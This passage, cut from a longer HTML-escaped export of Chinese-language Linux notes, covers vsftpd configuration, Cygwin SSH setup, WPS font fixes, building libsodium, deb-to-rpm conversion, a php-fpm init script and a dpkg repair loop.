&amp;#21015;&amp;#20986;&amp;#30340;&amp;#29992;&amp;#25143;&amp;#65292;&amp;#19981;&amp;#33021;&amp;#20999;&amp;#25442;&amp;#21040;&amp;#31449;&amp;#28857;&amp;#26681;&amp;#30446;&amp;#24405;&amp;#30340;&amp;#19978;&amp;#32423;&amp;#30446;&amp;#24405;&amp;#65307;&amp;#26410;&amp;#22312;&amp;#25991;&amp;#20214;&amp;#20013;&amp;#21015;&amp;#20986;&amp;#30340;&amp;#29992;&amp;#25143;&amp;#65292;&amp;#21487;&amp;#20197;&amp;#20999;&amp;#25442;&amp;#21040;&amp;#19978;&amp;#32423;&amp;#30446;&amp;#24405;&amp;#12290;&lt;/span&gt;
3&amp;#65289;&lt;span style=&quot;color: #FF8C00; font-weight: bold; font-style: italic; text-decoration: underline;&quot;&gt;&amp;#24403; chroot_list_enable=no&amp;#65292;chroot_local_user=yes&amp;#26102;&amp;#65292;&amp;#25152;&amp;#26377;&amp;#29992;&amp;#25143;&amp;#22343;&amp;#19981;&amp;#33021;&amp;#20999;&amp;#25442;&amp;#21040;&amp;#19978;&amp;#32423;&amp;#30446;&amp;#24405;&amp;#12290;&lt;/span&gt;
4&amp;#65289;&lt;span style=&quot;color: #FF8C00; font-weight: bold; font-style: italic; text-decoration: underline;&quot;&gt;&amp;#24403; chroot_list_enable=no&amp;#65292;chroot_local_user=no&amp;#26102;&amp;#65292;&amp;#25152;&amp;#26377;&amp;#29992;&amp;#25143;&amp;#22343;&amp;#21487;&amp;#20197;&amp;#20999;&amp;#25442;&amp;#21040;&amp;#19978;&amp;#32423;&amp;#30446;&amp;#24405;&amp;#12290;&lt;/span&gt;

5&amp;#65289;&lt;span style=&quot;color: #FF8C00; font-weight: bold; font-style: italic; text-decoration: underline;&quot;&gt;&amp;#24403;&amp;#29992;&amp;#25143;&amp;#19981;&amp;#20801;&amp;#35768;&amp;#20999;&amp;#25442;&amp;#21040;&amp;#19978;&amp;#32423;&amp;#30446;&amp;#24405;&amp;#26102;&amp;#65292;&amp;#30331;&amp;#24405;&amp;#21518;ftp&amp;#31449;&amp;#28857;&amp;#30340;&amp;#26681;&amp;#30446;&amp;#24405;&amp;#8220;/&amp;#8221;&amp;#26159;&amp;#35813;ftp&amp;#36134;&amp;#25143;&amp;#30340;&amp;#20027;&amp;#30446;&amp;#24405;&amp;#65292;&amp;#21363;&amp;#25991;&amp;#20214;&amp;#30340;&amp;#31995;&amp;#32479;&amp;#30340;/var/ftp&amp;#30446;&amp;#24405;&amp;#12290;&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
my vsftpd.conf
//CentOS 7, /etc/vsftpd/vsftpd.conf.
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot;&gt;# Example config file /etc/vsftpd/vsftpd.conf
# Allow anonymous FTP? (Beware - allowed by default if you comment this out).
anonymous_enable=NO
#
local_root=/srv/www/
#
# Uncomment this to allow local users to log in.
# When SELinux is enforcing check for SE bool ftp_home_dir
local_enable=YES
#
# Uncomment this to enable any form of FTP write command.
write_enable=YES
#
# Default umask for local users is 077. You may wish to change this to 022,
# if your users expect that (022 is used by most other ftpd's)
local_umask=022
#
# Uncomment this to allow the anonymous FTP user to upload files. This only
# has an effect if the above global write enable is activated. Also, you will
# obviously need to create a directory writable by the FTP user.
# When SELinux is enforcing check for SE bool allow_ftpd_anon_write, allow_ftpd_full_access
#anon_upload_enable=YES
#
# Uncomment this if you want the anonymous FTP user to be able to create
# new directories.
#anon_mkdir_write_enable=YES
#
# Activate directory messages - messages given to remote users when they
# go into a certain directory.
dirmessage_enable=YES
#
# Activate logging of uploads/downloads.
xferlog_enable=YES
#
# Make sure PORT transfer connections originate from port 20 (ftp-data).
connect_from_port_20=YES
#
# If you want, you can arrange for uploaded anonymous files to be owned by
# a different user. Note! Using &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;root&quot;&lt;/span&gt; for uploaded files is not
# recommended!
#chown_uploads=YES
#chown_username=whoever
#
# You may override where the log file goes if you like. The default is shown
# below.
#xferlog_file=/var/log/xferlog
#
# If you want, you can have your log file in standard ftpd xferlog format.
# Note that the default log file location is /var/log/xferlog in this case.
xferlog_std_format=YES
#
# You may change the default value for timing out an idle session.
#idle_session_timeout=600
#
# You may change the default value for timing out a data connection.
#data_connection_timeout=120
#
# It is recommended that you define on your system a unique user which the
# ftp server can use as a totally isolated and unprivileged user.
#nopriv_user=ftpsecure
#
# Enable this and the server will recognise asynchronous ABOR requests. Not
# recommended for security (&lt;span style=&quot;color: #FF1493;&quot;&gt;the&lt;/span&gt; code is non-trivial). Not enabling it,
# however, may confuse older FTP clients.
#async_abor_enable=YES
#
# By default the server will pretend to allow ASCII mode but in fact ignore
# the request. Turn on the below options to have the server actually do ASCII
# mangling on files when in ASCII mode.
# Beware that on some FTP servers, ASCII support allows a denial of service
# attack (DoS) via the command &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;SIZE /big/file&quot;&lt;/span&gt; in ASCII mode. vsftpd
# predicted this attack and has always been safe, reporting the size of the
# raw file.
# ASCII mangling is a horrible feature of the protocol.
#ascii_upload_enable=YES
#ascii_download_enable=YES
#
# You may fully customise the login banner string:
#ftpd_banner=Welcome to blah FTP service.
#
# You may specify a file of disallowed anonymous e-mail addresses. Apparently
# useful for combatting certain DoS attacks.
#deny_email_enable=YES
# (default follows)
#banned_email_file=/etc/vsftpd/banned_emails
#
# You may specify an explicit list of local users to chroot() to their home
# directory. If chroot_local_user is YES, then this list becomes a list of
# users to NOT chroot().
# (Warning! chroot'ing can be very dangerous. If using chroot, make sure that
# the user does not have write access to the top level directory within the
# chroot)
chroot_local_user=YES
chroot_list_enable=YES
allow_writeable_chroot=YES
# (default follows)
chroot_list_file=/etc/vsftpd/chroot_list
#
# You may activate the &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;-R&quot;&lt;/span&gt; option to the builtin ls. This is disabled by
# default to avoid remote users being able to cause excessive I/O on large
# sites. However, some broken FTP clients such as &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;ncftp&quot;&lt;/span&gt; and &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;mirror&quot;&lt;/span&gt; assume
# the presence of the &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;-R&quot;&lt;/span&gt; option, so there is a strong case for enabling it.
#ls_recurse_enable=YES
#
# When &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;listen&quot;&lt;/span&gt; directive is enabled, vsftpd runs in standalone mode and
# listens on IPv4 sockets. This directive cannot be used in conjunction
# with the listen_ipv6 directive.
listen=NO
#
# This directive enables listening on IPv6 sockets. By default, listening
# on the IPv6 &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;any&quot;&lt;/span&gt; address (&lt;span style=&quot;color: #FF1493;&quot;&gt;::&lt;/span&gt;) will accept connections from both IPv6
# and IPv4 clients. It is not necessary to listen on *both* IPv4 and IPv6
# sockets. If you want that (perhaps because you want to listen on specific
# addresses) &lt;span style=&quot;color: #FF8C00; font-weight: bold; font-style: italic; text-decoration: underline;&quot;&gt;then you must run two copies of vsftpd with two configuration&lt;/span&gt;
# files.
# Make sure, that one of the listen options is commented !!
listen_ipv6=YES

pam_service_name=vsftpd
userlist_enable=YES
tcp_wrappers=YES
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
References
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
https://security.appspot.com/vsftpd.html
https://en.wikipedia.org/wiki/Vsftpd
http://baike.baidu.com/item/vsftpd

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org3c2c1cf&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org3c2c1cf&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.8.17&lt;/span&gt; Cygwin：windows 下 Linux 模拟软件&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-8-17&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
安装Cygwin
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
略
提示：安装软件时，可使用中国科技大学软件源mirrors.ustc.edu.cn/cygwin

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 举例说明：安装及配置ssh
1.运行安装文件
2.搜索ssh，在Net类别下选上OpenSSH和OpenSSL两项
3.安装完成后，打开Cygwin，输入ssh-host-config
当询问if privilege separation should be used 时输入 no . 
当询问if sshd should be installed as a service 时输入yes . 
当询问about the value of CYGWIN environment variable enter 时输入 ntsec .
其余询问均输入 no
4.在cygwin中输入 cygrunsrv --start sshd 启动sshd
5.打开cygwin，输入 ssh-keygen，当询问要filenames 和 pass phrases 的时候都点回车，接受默认的值
6.命令结束后输入 cd ~/.ssh 转到.ssh目录，输入 ls –l 应该包含两个文件：id_rsa.pub 和 id_rsa
7.在第8步的窗口（当前目录在.ssh）中输入 cat id_rsa.pub &amp;gt;&amp;gt; authorized_keys
8.输入 ssh localhost 启动SSH

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
参考资料
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
1.Cygwin-Official Site:http://cygwin.com/
2.Cygwin-Wikipedia:https://en.wikipedia.org/wiki/Cygwin
3.Cygwin-百度百科：http://baike.baidu.com/view/3968.htm
4.Cygwin在线安装指南：http://www.crifan.com/files/doc/docbook/cygwin_intro/release/htmls/install_cygwin_setup_exe.html

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org75eb043&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org75eb043&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.8.18&lt;/span&gt; Wps for Linux&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-8-18&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
1. 从官网下载安装包，网址：http://www.wps.cn/

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
2. 安装
$ sudo dpkg -i wps_office_10.xxx.deb

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
3. 安装完成后，提示“系统缺失字体symbol、wingdings、wingdings 2、wingdings 3、webding”的解决办法：
1) 下载缺失的字体文件，然后复制到Linux系统中的/usr/share/fonts文件夹中。
国外下载地址：https://www.dropbox.com/s/lfy4hvq95ilwyw5/wps_symbol_fonts.zip
国内下载地址：http://pan.baidu.com/s/1mh0lcbY
或者直接 在win 中（C/WINDOWS/FONTS）
2) 执行以下命令,生成字体的索引信息：
$ sudo mkfontscale
$ sudo mkfontdir
3) 运行fc-cache命令更新字体缓存
$ sudo fc-cache

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgdc57247&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgdc57247&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.8.19&lt;/span&gt; gnome-screenshots&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-8-19&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
常用快捷键
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
Prt Scrn to take a screenshot of the desktop.
Alt+Prt Scrn to take a screenshot of a window.
Shift+Prt Scrn to take a screenshot of an area you select.

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;参考资料(References)
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://help.gnome.org/users/gnome-help/stable/screen-shot-record.html.en&quot;&gt;Screenshots and screencasts&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org80941a0&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org80941a0&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;6&lt;/span&gt; Problem&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-6&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgd9fad23&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgd9fad23&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.1&lt;/span&gt; 命令行下不能输入中文标点符号&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-1&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
使用快捷键 Ctrl+. 一个是lation 符号，一个是全角符号。

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org231ca86&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org231ca86&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.2&lt;/span&gt; 不能在 Sublime 编辑器（Editor）中输入中文&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
下载（Download）
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ git clone https://github.com/lyfeyaj/sublime-text-imfix.git

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
配置（Configure）
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ cd ~/sublime-text-imfix
$ sudo cp ./lib/libsublime-imfix.so /opt/sublime_text/
$ sudo cp ./src/subl /usr/bin/ 
$ LD_PRELOAD=./libsublime-imfix.so subl

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
新建Shell脚本
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ vim /home/zrg/sublime
#!/bin/bash
LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so subl

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
参考资料
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
http://www.jianshu.com/p/bf05fb3a4709

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgcfa83a7&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgcfa83a7&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.3&lt;/span&gt; 解决系统不能支持加密算法：chacha20&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-3&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo apt-get install m2crypto gcc -y
$ wget -N --no-check-certificate https://download.libsodium.org/libsodium/releases/libsodium-1.0.8.tar.gz
$ tar zxvf libsodium-1.0.8.tar.gz
$ cd libsodium-1.0.8
$ ./configure
$ sudo make &amp;amp;&amp;amp; make install
$ sudo echo &quot;include ld.so.conf.d/*.conf&quot;&amp;gt;/etc/ld.so.conf
$ sudo echo &quot;/lib&quot;&amp;gt;&amp;gt;/etc/ld.so.conf
$ sudo echo &quot;/usr/lib64&quot;&amp;gt;&amp;gt;/etc/ld.so.conf
$ sudo echo &quot;/usr/local/lib&quot;&amp;gt;&amp;gt;/etc/ld.so.conf
$ ldconfig

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orge112525&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orge112525&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.4&lt;/span&gt; 软件源配置不全，导致软件不能安装&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-4&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
//Error: Can't fix the error because you are asking some packages to stay the same, that is they break the dependencies between the packages.
//翻译：无法修正错误,因为您要求某些软件包保持现状,就是它们破坏了软件包间的依赖关系
//解决：检查安装源，进行重新配置，必要时添加debian官方安装源
$ vim /etc/apt/sources.list
$ sudo apt-get update

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org7ede71e&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org7ede71e&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.5&lt;/span&gt; .deb 转换为 .rpm&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-5&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org3833d5e&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org3833d5e&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.5.1&lt;/span&gt; 下载及安装 alien&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-6-5-1&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
1.下载:
$ wget https://packages.debian.org/unstable/source/alien

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
2.安装:
$ tar xpvf alien_8.95.tar.xz 
$ cd alien-8.95
$ make &amp;amp;&amp;amp; make install

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org45c52b6&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org45c52b6&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.5.2&lt;/span&gt; 转换(Conversion)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-6-5-2&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
$ alien -r kuaipan4uk_2.0.0.5_amd64.deb

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org264c2bc&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org264c2bc&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.6&lt;/span&gt; 软件自启动脚本实例&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-6&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgb42b0fd&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgb42b0fd&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.6.1&lt;/span&gt; 实例：php-fpm 服务启动脚本&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-6-6-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;$ sudo vim /etc/init.d/php-fpm&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot;&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;!/bin/&lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;sh&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;DateTime:2017-03-09&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;Author:zrg&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;chkconfig: - 84 16&lt;/span&gt;
. /etc/rc.d/init.d/functions

&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;Source networking configuration.&lt;/span&gt;
. /etc/sysconfig/network

&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;Check that networking is up.&lt;/span&gt;
[ &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;$NETWORKING&quot;&lt;/span&gt; = &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;no&quot;&lt;/span&gt; ] &amp;amp;&amp;amp; &lt;span style=&quot;color: #FF1493;&quot;&gt;exit&lt;/span&gt; 0

&lt;span style=&quot;color: #FF8C00;&quot;&gt;phpfpm&lt;/span&gt;=&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;/usr/local/php/sbin/php-fpm&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;prog&lt;/span&gt;=$(basename ${&lt;span style=&quot;color: #FF8C00;&quot;&gt;phpfpm&lt;/span&gt;})

&lt;span style=&quot;color: #FF8C00;&quot;&gt;lockfile&lt;/span&gt;=/var/lock/subsys/phpfpm

&lt;span style=&quot;color: #87D700;&quot;&gt;start&lt;/span&gt;() {
    [ -x ${&lt;span style=&quot;color: #FF8C00;&quot;&gt;phpfpm&lt;/span&gt;} ] || &lt;span style=&quot;color: #FF1493;&quot;&gt;exit&lt;/span&gt; 5
    &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; -n $&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;Starting $prog: &quot;&lt;/span&gt;
    daemon ${&lt;span style=&quot;color: #FF8C00;&quot;&gt;phpfpm&lt;/span&gt;}
    &lt;span style=&quot;color: #FF8C00;&quot;&gt;retval&lt;/span&gt;=$&lt;span style=&quot;color: #FF8C00;&quot;&gt;?&lt;/span&gt;
    &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt;
    [ $&lt;span style=&quot;color: #FF8C00;&quot;&gt;retval&lt;/span&gt; -eq 0 ] &amp;amp;&amp;amp; touch $&lt;span style=&quot;color: #FF8C00;&quot;&gt;lockfile&lt;/span&gt;
    &lt;span style=&quot;color: #FF1493;&quot;&gt;return&lt;/span&gt; $&lt;span style=&quot;color: #FF8C00;&quot;&gt;retval&lt;/span&gt;
}

&lt;span style=&quot;color: #87D700;&quot;&gt;stop&lt;/span&gt;() {
    &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; -n $&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;Stopping $prog: &quot;&lt;/span&gt;
    killproc $&lt;span style=&quot;color: #FF8C00;&quot;&gt;prog&lt;/span&gt; -QUIT
    &lt;span style=&quot;color: #FF8C00;&quot;&gt;retval&lt;/span&gt;=$&lt;span style=&quot;color: #FF8C00;&quot;&gt;?&lt;/span&gt;
    &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt;
    [ $&lt;span style=&quot;color: #FF8C00;&quot;&gt;retval&lt;/span&gt; -eq 0 ] &amp;amp;&amp;amp; rm -f $&lt;span style=&quot;color: #FF8C00;&quot;&gt;lockfile&lt;/span&gt;
    &lt;span style=&quot;color: #FF1493;&quot;&gt;return&lt;/span&gt; $&lt;span style=&quot;color: #FF8C00;&quot;&gt;retval&lt;/span&gt;
}

&lt;span style=&quot;color: #87D700;&quot;&gt;restart&lt;/span&gt;() {
    configtest || &lt;span style=&quot;color: #FF1493;&quot;&gt;return&lt;/span&gt; $&lt;span style=&quot;color: #FF8C00;&quot;&gt;?&lt;/span&gt;
    stop
    start
}

&lt;span style=&quot;color: #87D700;&quot;&gt;reload&lt;/span&gt;() {
    configtest || &lt;span style=&quot;color: #FF1493;&quot;&gt;return&lt;/span&gt; $&lt;span style=&quot;color: #FF8C00;&quot;&gt;?&lt;/span&gt;
    &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; -n $&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;Reloading $prog: &quot;&lt;/span&gt;
killproc ${&lt;span style=&quot;color: #FF8C00;&quot;&gt;phpfpm&lt;/span&gt;} -HUP
    &lt;span style=&quot;color: #FF8C00;&quot;&gt;RETVAL&lt;/span&gt;=$&lt;span style=&quot;color: #FF8C00;&quot;&gt;?&lt;/span&gt;
    &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt;
}

&lt;span style=&quot;color: #87D700;&quot;&gt;force_reload&lt;/span&gt;() {
    restart
}

&lt;span style=&quot;color: #87D700;&quot;&gt;configtest&lt;/span&gt;() {
  ${&lt;span style=&quot;color: #FF8C00;&quot;&gt;phpfpm&lt;/span&gt;} -t
}

&lt;span style=&quot;color: #87D700;&quot;&gt;rh_status&lt;/span&gt;() {
    status $&lt;span style=&quot;color: #FF8C00;&quot;&gt;prog&lt;/span&gt;
}

&lt;span style=&quot;color: #87D700;&quot;&gt;rh_status_q&lt;/span&gt;() {
    rh_status &amp;gt;/dev/null 2&amp;gt;&amp;amp;1
}

&lt;span style=&quot;color: #FF1493;&quot;&gt;case&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;$1&quot;&lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt; in&lt;/span&gt;
    start)
        rh_status_q &amp;amp;&amp;amp; &lt;span style=&quot;color: #FF1493;&quot;&gt;exit&lt;/span&gt; 0
        $&lt;span style=&quot;color: #FF8C00;&quot;&gt;1&lt;/span&gt;
        ;;
    stop)
        rh_status_q || &lt;span style=&quot;color: #FF1493;&quot;&gt;exit&lt;/span&gt; 0
        $&lt;span style=&quot;color: #FF8C00;&quot;&gt;1&lt;/span&gt;
        ;;
    restart|configtest)
        $&lt;span style=&quot;color: #FF8C00;&quot;&gt;1&lt;/span&gt;
        ;;
    reload)
        rh_status_q || &lt;span style=&quot;color: #FF1493;&quot;&gt;exit&lt;/span&gt; 7
        $&lt;span style=&quot;color: #FF8C00;&quot;&gt;1&lt;/span&gt;
        ;;
    status)
        rh_status
        ;;
     *)
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; $&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;Usage: $0 {start|stop|status|restart|reload|configtest}&quot;&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;exit&lt;/span&gt; 2
&lt;span style=&quot;color: #FF1493;&quot;&gt;esac&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;pre class=&quot;example&quot;&gt;
脚本说明：
# Source function library.  
. /etc/rc.d/init.d/functions  //类似于include,require，引入文件。
# Source networking configuration.  
. /etc/sysconfig/network   //同理。
//引入后，用到的daemon、status
NETWORKING=yes
 HOSTNAME=E10162
//将他们作为变量赋值,判断网卡是否启动，如果你的 nginx 不走网卡，其实网络这段可以去掉
//daemon便是实现上图漂亮的【 OK 】的函数.

&lt;/pre&gt;
&lt;p&gt;
2.设置自启动
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# php-fpm 加入服务
chkconfig --add php-fpm
# php-fpm 234 级别下设置为启动
chkconfig php-fpm on
# 查看 php-fpm 服务当前配置
chkconfig --list php-fpm
php-fpm         0:off   1:off   2:on    3:on    4:on    5:on    6:off

&lt;/pre&gt;
&lt;p&gt;
3.php-fpm操作
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# 启动/关闭/重启/重载
service php-fpm start/stop/restart/reload
# 检查配置文件
#service php-fpm configtest

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgdabaabf&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgdabaabf&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.6.2&lt;/span&gt; References&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-6-6-2&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;http://www.ttlsa.com/php/php-fpm-service-scripts/&quot;&gt;http://www.ttlsa.com/php/php-fpm-service-scripts/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org98bfa04&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org98bfa04&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.7&lt;/span&gt; 解决 dpkg: warning: files list file for package 'x' missing 问题&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-7&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 3: &lt;/span&gt;&lt;/label&gt;&lt;pre class=&quot;src src-shell&quot;&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;for&lt;/span&gt; package&lt;span style=&quot;color: #FF1493;&quot;&gt; in&lt;/span&gt; $(apt-get upgrade 2&amp;gt;&amp;amp;1 |&lt;span style=&quot;color: #CDC673; font-weight: bold;&quot;&gt;\&lt;/span&gt;
                 grep &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;warning: files list file for package '&quot;&lt;/span&gt; |&lt;span style=&quot;color: #CDC673; font-weight: bold;&quot;&gt;\&lt;/span&gt;
                 grep -Po &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;[^'\n ]+'&quot;&lt;/span&gt; | grep -Po &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;[^']+&quot;&lt;/span&gt;); &lt;span style=&quot;color: #FF1493;&quot;&gt;do&lt;/span&gt;
    apt-get install --reinstall &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;$package&quot;&lt;/span&gt;;
